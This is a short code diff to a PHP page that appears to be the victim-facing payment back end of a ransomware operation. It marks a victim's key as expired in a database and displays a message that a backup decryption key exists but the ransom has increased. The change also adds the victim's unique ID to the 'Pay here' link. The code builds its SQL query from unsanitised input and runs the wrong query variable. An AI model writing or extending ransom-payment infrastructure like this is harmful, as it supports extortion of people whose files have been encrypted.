@@ -35,7 +35,7 @@ if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
              echo "$('#form_div').hide();" . "\n";
              echo "$('#what_happened').hide();" . "\n";
 
-             $sql1 = "UPDATE target_list SET time_expired=\"TRUE\" where unique_id = \"$targetID\"";
+             $sql1 = "UPDATE target_list SET time_expired=\"1\" where unique_id = \"$targetID\"";
              $result1 = $conn->query($sql);
 
              if ($result->num_rows > 0) {
@@ -45,7 +45,7 @@ if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
                 echo "<br /><br /><br />";
                 echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
                 echo "</font>";
-                echo "<a href='/payment.php'>Pay here</a><br /><br />";
+                echo "<a href='/payment.php?unique_id=$targetID'>Pay here</a><br /><br />";
                 echo "</center>";
              }
           } else {
